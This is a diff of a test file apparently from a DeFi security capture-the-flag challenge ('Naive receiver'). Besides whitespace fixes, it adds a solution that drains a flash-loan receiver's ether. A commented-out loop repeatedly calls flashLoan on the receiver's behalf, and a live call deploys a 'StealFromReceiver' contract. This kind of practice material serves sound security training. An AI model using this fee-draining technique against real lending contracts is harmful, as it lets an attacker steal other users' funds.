@@ -17,11 +17,11 @@ describe('[Challenge] Naive receiver', function () {
 
         const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
         const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);
-        
+
         pool = await LenderPoolFactory.deploy();
         await deployer.sendTransaction({ to: pool.address, value: ETHER_IN_POOL });
         const ETH = await pool.ETH();
-        
+
         expect(await ethers.provider.getBalance(pool.address)).to.be.equal(ETHER_IN_POOL);
         expect(await pool.maxFlashLoan(ETH)).to.eq(ETHER_IN_POOL);
         expect(await pool.flashFee(ETH, 0)).to.eq(10n ** 18n);
@@ -29,7 +29,7 @@ describe('[Challenge] Naive receiver', function () {
         receiver = await FlashLoanReceiverFactory.deploy(pool.address);
         await deployer.sendTransaction({ to: receiver.address, value: ETHER_IN_RECEIVER });
         await expect(
-            receiver.onFlashLoan(deployer.address, ETH, ETHER_IN_RECEIVER, 10n**18n, "0x")
+            receiver.onFlashLoan(deployer.address, ETH, ETHER_IN_RECEIVER, 10n ** 18n, "0x")
         ).to.be.reverted;
         expect(
             await ethers.provider.getBalance(receiver.address)
@@ -38,6 +38,22 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const ETH = await pool.ETH();
+        const FIXED_FEE = await pool.flashFee(ETH, 0);
+
+        /*
+        Solution 1: Run the flash loan on behalf of receiver until no more ethers left
+        */
+        // while (await ethers.provider.getBalance(receiver.address) >= FIXED_FEE) {
+        //     await pool.connect(player).flashLoan(receiver.address, ETH, 1n, "0x");
+        // }
+
+        /*
+        Solution 2: deploy contract and do it at once
+        */
+        const steal = await (await ethers.getContractFactory('StealFromReceiver', player)).deploy();
+        await steal.connect(player).steal(pool.address, receiver.address, ETH);
+
     });
 
     after(async function () {
